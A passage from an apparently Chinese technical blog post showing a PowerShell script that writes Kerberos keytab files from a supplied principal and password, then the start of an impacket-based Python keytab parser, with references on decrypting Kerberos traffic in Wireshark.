</span></span><span class=line><span class=cl><span class=nv>$Realm</span> <span class=p>=</span> <span class=nv>$Realm</span><span class=p>.</span><span class=py>ToUpper</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### The Components array splits the primary/principal.</span>
</span></span><span class=line><span class=cl><span class=nv>$PrincipalArray</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nv>$PrincipalArray</span> <span class=p>=</span> <span class=nv>$Principal</span><span class=p>.</span><span class=py>Split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c>### Check For Custom SALT</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>([</span><span class=no>string</span><span class=p>]::</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=nv>$SALT</span><span class=p>)</span> <span class=o>-eq</span> <span class=vm>$true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$SALT</span> <span class=p>=</span> <span class=nv>$Realm</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=p>=</span><span class=mf>0</span><span class=p>;</span><span class=nv>$i</span> <span class=o>-lt</span> <span class=nv>$PrincipalArray</span><span class=p>.</span><span class=n>Count</span><span class=p>;</span><span class=nv>$i</span><span class=p>++){</span>
</span></span><span class=line><span class=cl><span class=nv>$SALT</span> <span class=p>+=</span> <span class=vm>$</span><span class=p>(</span><span class=nv>$PrincipalArray</span><span class=p>[</span><span class=nv>$i</span><span class=p>].</span><span class=py>Replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c>### Finish spliting principal into component parts. PrincipalArray should have at most 2 elements. Testing with Java based tools, </span>
</span></span><span class=line><span class=cl><span class=c>### the keytab entry can only support one UPN. The components portion of the keytab entry appears to only be for spliting</span>
</span></span><span class=line><span class=cl><span class=c>### a UPN in an SPN format. e.g. HOST/user@dev.home</span>
</span></span><span class=line><span class=cl><span class=nv>$PrincipalText</span> <span class=p>=</span> <span class=nv>$Principal</span>
</span></span><span class=line><span class=cl><span class=nv>$Principal</span> <span class=p>=</span> <span class=nv>$Principal</span><span class=p>.</span><span class=py>Replace</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>,</span><span class=s2>&#34;,&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$PrincipalArray</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nv>$PrincipalArray</span> <span class=p>=</span> <span class=nv>$Principal</span><span class=p>.</span><span class=py>Split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$keyTabVersion</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>05</span><span class=p>,</span><span class=mf>02</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$keyTabEntries</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Set Default Encryption to AES256 if none of the E-Type switches are set</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(!</span><span class=nv>$RC4</span> <span class=o>-and</span> <span class=p>!</span><span class=nv>$AES128</span> <span class=o>-and</span> <span class=p>!</span><span class=nv>$AES256</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$AES256</span> <span class=p>=</span> <span class=vm>$true</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Truncate KVNO</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Byte[]</span><span class=p>]</span> <span class=nv>$KVNO</span> <span class=p>=</span> <span class=p>[</span><span class=no>Byte[]</span><span class=p>](</span><span class=nb>Get-BytesBigEndian</span> <span class=n>-BitSize</span> <span class=mf>32</span> <span class=n>-Value</span> <span class=nv>$KVNO</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>int16</span><span class=p>]</span> <span class=nv>$KVNO</span> <span class=p>=</span> <span class=p>[</span><span class=no>int</span><span class=p>]</span><span class=nv>$KVNO</span><span class=p>[</span><span class=mf>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Create KeyTab Entries for selected E-Types RC4/AES128/AES256 supported</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$RC4</span> <span class=o>-eq</span> <span class=vm>$true</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=nb>Create-KeyTabEntry</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-realmString</span> <span class=nv>$Realm</span> <span class=n>-Components</span> <span class=nv>$PrincipalArray</span> <span class=n>-passwordString</span> <span class=nv>$Password</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-PrincipalType</span> <span class=nv>$PType</span> <span class=n>-EncryptionKeyType</span> <span class=n>RC4</span> <span class=n>-KVNO</span> <span class=nv>$KVNO</span>
</span></span><span class=line><span class=cl><span class=nv>$keyTabEntries</span> <span class=p>+=</span> <span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeytabEntry</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Script:Silent</span> <span class=o>-eq</span> <span class=vm>$false</span><span class=p>){</span> <span class=nb>Write-Host</span> <span class=s2>&#34;RC4:&#34;</span><span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeyBlock</span> <span class=n>-ForegroundColor</span> <span class=n>Cyan</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$AES128</span> <span class=o>-eq</span> <span class=vm>$true</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=nb>Create-KeyTabEntry</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-realmString</span> <span class=nv>$Realm</span> <span class=n>-Components</span> <span class=nv>$PrincipalArray</span> <span class=n>-passwordString</span> <span class=nv>$Password</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-PrincipalType</span> <span class=nv>$PType</span> <span class=n>-EncryptionKeyType</span> <span class=n>AES128</span> <span class=n>-KVNO</span> <span class=nv>$KVNO</span> <span class=n>-SALT</span> <span class=nv>$SALT</span>
</span></span><span class=line><span class=cl><span class=nv>$keyTabEntries</span> <span class=p>+=</span> <span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeytabEntry</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Script:Silent</span> <span class=o>-eq</span> <span class=vm>$false</span><span class=p>){</span> <span class=nb>Write-Host</span> <span class=s2>&#34;AES128:&#34;</span><span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeyBlock</span> <span class=n>-ForegroundColor</span> <span class=n>Cyan</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=vm>$null</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$AES256</span> <span class=o>-eq</span> <span class=vm>$true</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=nb>Create-KeyTabEntry</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-realmString</span> <span class=nv>$Realm</span> <span class=n>-Components</span> <span class=nv>$PrincipalArray</span> <span class=n>-passwordString</span> <span class=nv>$Password</span> <span class=p>`</span>
</span></span><span class=line><span class=cl><span class=n>-PrincipalType</span> <span class=nv>$PType</span> <span class=n>-EncryptionKeyType</span> <span class=n>AES256</span> <span class=n>-KVNO</span> <span class=nv>$KVNO</span> <span class=n>-SALT</span> <span class=nv>$SALT</span>
</span></span><span class=line><span class=cl><span class=nv>$keyTabEntries</span> <span class=p>+=</span> <span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeytabEntry</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Script:Silent</span> <span class=o>-eq</span> <span class=vm>$false</span><span class=p>){</span> <span class=nb>Write-Host</span> <span class=s2>&#34;AES256:&#34;</span><span class=nv>$keytabEntry</span><span class=p>.</span><span class=py>KeyBlock</span> <span class=n>-ForegroundColor</span> <span class=n>Cyan</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Script:Silent</span> <span class=o>-eq</span> <span class=vm>$false</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;Principal Type:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$PType</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;Realm:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$Realm</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;User Name:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$PrincipalText</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;SALT:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$SALT</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;Keytab File:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$File</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=vm>$</span><span class=p>(</span><span class=s2>&#34;Append File:&#34;</span><span class=p>).</span><span class=py>PadLeft</span><span class=p>(</span><span class=mf>15</span><span class=p>)</span><span class=nv>$Append</span> <span class=n>-ForegroundColor</span> <span class=n>Green</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(!</span><span class=nv>$NoPrompt</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;Press Enter to Write KeyTab File /Ctrl+C to quit...&#34;</span> <span class=n>-ForegroundColor</span> <span class=n>Yellow</span> <span class=n>-NoNewline</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>void</span><span class=p>](</span><span class=nb>Read-Host</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>Write-Host</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Append</span> <span class=o>-eq</span> <span class=vm>$true</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$fileBytes</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>([</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>Exists</span><span class=p>(</span><span class=nv>$File</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$fileBytes</span> <span class=p>+=</span> <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>ReadAllBytes</span><span class=p>(</span><span class=nv>$File</span><span class=p>)</span> <span class=p>+</span> <span class=nv>$keyTabEntries</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>WriteAllBytes</span><span class=p>(</span><span class=nv>$File</span><span class=p>,</span><span class=nv>$fileBytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$fileBytes</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nv>$fileBytes</span> <span class=p>+=</span> <span class=nv>$keyTabVersion</span>
</span></span><span class=line><span class=cl>    <span class=nv>$fileBytes</span> <span class=p>+=</span> <span class=nv>$keyTabEntries</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>WriteAllBytes</span><span class=p>(</span><span class=nv>$File</span><span class=p>,</span><span class=nv>$fileBytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$fileBytes</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nv>$fileBytes</span> <span class=p>+=</span> <span class=nv>$keyTabVersion</span>
</span></span><span class=line><span class=cl><span class=nv>$fileBytes</span> <span class=p>+=</span> <span class=nv>$keyTabEntries</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>System.IO.File</span><span class=p>]::</span><span class=n>WriteAllBytes</span><span class=p>(</span><span class=nv>$File</span><span class=p>,</span><span class=nv>$fileBytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></td></tr></table></div></div><p>方法二：基于impacket生成 keytab</p><p>参考文章：</p><ol><li><p><a href=https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7 target=_blank rel="external nofollow noopener noreferrer">https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7</a></p></li><li><p><a href=https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way target=_blank rel="external nofollow noopener noreferrer">https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way</a></p></li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>struct</span> <span class=kn>import</span> <span class=n>unpack</span><span class=p>,</span> <span class=n>pack</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>impacket.structure</span> <span class=kn>import</span> <span class=n>Structure</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Keytab structure from http://www.ioplex.com/utilities/keytab.txt</span>
</span></span><span class=line><span class=cl>  <span class=c1># keytab {</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint16_t file_format_version;                    /* 0x502 */</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     keytab_entry entries[*];</span>
</span></span><span class=line><span class=cl>  <span class=c1># };</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1># keytab_entry {</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     int32_t size;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint16_t num_components;    /* sub 1 if version 0x501 */</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     counted_octet_string realm;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     counted_octet_string components[num_components];</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint32_t name_type;   /* not present if version 0x501 */</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint32_t timestamp;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint8_t vno8;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     keyblock key;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint32_t vno; /* only present if &gt;= 4 bytes left in entry */</span>
</span></span><span class=line><span class=cl>  <span class=c1># };</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1># counted_octet_string {</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint16_t length;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint8_t data[length];</span>
</span></span><span class=line><span class=cl>  <span class=c1># };</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1># keyblock {</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     uint16_t type;</span>
</span></span><span class=line><span class=cl>  <span class=c1>#     counted_octet_string;</span>
</span></span><span class=line><span class=cl>  <span class=c1># };</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>KeyTab</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;file_format_version&#39;</span><span class=p>,</span><span class=s1>&#39;H=517&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;keytab_entry&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fromString</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>entries</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>Structure</span><span class=o>.</span><span class=n>fromString</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;keytab_entry&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>ktentry</span> <span class=o>=</span> <span class=n>KeyTabEntry</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>ktentry</span><span class=o>.</span><span class=n>getData</span><span class=p>()):]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>entries</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ktentry</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getData</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;keytab_entry&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=n>entry</span><span class=o>.</span><span class=n>getData</span><span class=p>()</span> <span class=k>for</span> <span class=n>entry</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>entries</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>Structure</span><span class=o>.</span><span class=n>getData</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>OctetString</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;len&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;H-value&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;value&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>KeyTabContentRest</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;name_type&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;I=1&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;timestamp&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;I=0&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;vno8&#39;</span><span class=p>,</span> <span class=s1>&#39;B=2&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;keytype&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;H&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;keylen&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;H-key&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;key&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>KeyTabContent</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>structure</span> <span class=o>=</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;num_components&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;h&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;realmlen&#39;</span><span class=p>,</span> <span class=s1>&#39;&gt;h-realm&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;realm&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;components&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s1>&#39;restdata&#39;</span><span class=p>,</span><span class=s1>&#39;:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>fromString</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>components</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>Structure</span><span class=o>.</span><span class=n>fromString</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=bp>self</span><span class=p>[</span><span class=s1>&#39;components&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=bp>self</span><span class=p>[</span><span class=s1>&#39;num_components&#39;</span><span class=p>]):</span>
</span></span><span class=line><span class=cl>            <span class=n>ktentry</span> <span class=o>=</span> <span class=n>OctetString</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>ktentry</span><span class=p>[</span><span class=s1>&#39;len&#39;</span><span class=p>]</span><span class=o>+</span><span class=mi>2</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>components</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>ktentry</span><span class=p>)</span>
